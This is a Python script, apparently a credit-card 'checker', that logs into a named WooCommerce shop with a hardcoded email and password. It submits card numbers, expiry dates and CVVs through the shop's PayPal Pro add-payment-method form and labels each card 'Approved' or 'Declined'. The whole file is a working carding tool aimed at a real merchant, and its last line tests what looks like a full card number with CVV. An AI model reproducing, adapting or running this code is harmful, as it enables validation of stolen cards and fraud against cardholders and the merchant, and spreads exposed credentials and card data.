from requests import ( Session )

def getstr(text: str, a: str, b: str) -> str: return text.split(a)[1].split(b)[0]

class PayflowAuth2:
    def main(self,card):
        try:
            self.session = Session()
            cc,month,year,cvv = card.split('|')

            self.headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',}
            self.req1 = self.session.get('https://hotcombs.net/my-account/', headers=self.headers)
            self.Login_Nonce = getstr(self.req1.text, 'name="woocommerce-login-nonce" value="', '"')
                        
            self.headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-ES,es;q=0.9','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://hotcombs.net','priority': 'u=0, i','referer': 'https://hotcombs.net/my-account/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',}
            self.data = {'username': 'hfcfamxx@gmail.com', 'password': 'juanse2006D!','woocommerce-login-nonce': self.Login_Nonce,'_wp_http_referer': '/my-account/','login': 'Log in',}
            self.session.post('https://hotcombs.net/my-account/', headers=self.headers, data=self.data)

            self.headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','referer': 'https://hotcombs.net/my-account/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',}
            self.req2 =self.session.get('https://hotcombs.net/my-account/add-payment-method/', headers=self.headers)
            self.nonce_add = getstr(self.req2.text, 'name="woocommerce-add-payment-method-nonce" value="', '"')
        
            self.headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-ES,es;q=0.9','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://hotcombs.net','priority': 'u=0, i','referer': 'https://hotcombs.net/my-account/add-payment-method/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',}
            self.data = {'payment_method': 'paypal_pro','paypal_pro-card-cardholder-first': 'Famax','paypal_pro-card-cardholder-last': 'Prox','paypal_pro-card-number': cc,'paypal_pro_card_expiration_month': month,'paypal_pro_card_expiration_year': year,'paypal_pro-card-cvc': cvv,'woocommerce-add-payment-method-nonce': self.nonce_add,'_wp_http_referer': '/my-account/add-payment-method/','woocommerce_add_payment_method': '1',}
            self.response =  self.session.post('https://hotcombs.net/my-account/add-payment-method/', headers=self.headers, data=self.data)
                    
            if 'Payment method successfully added.' in self.response.text:return "Approved! ✅","successfully added!"
            elif '15004 - This transaction cannot be processed. Please enter a valid Credit Card Verification Number' in self.response.text: return "Approved! ✅","15004 - This transaction cannot be processed. Please enter a valid Credit Card Verification Number"
            return 'Declined! ❌',getstr(self.response.text, 'class="woocommerce-error" role="alert">', '</li>').split('<li>')[1].split("\t\t\t")[1]

        except: return 'Declined! ❌','15005 - This transaction cannot be processeda'


print(PayflowAuth2().main('4169161494214264|08|2029|389'))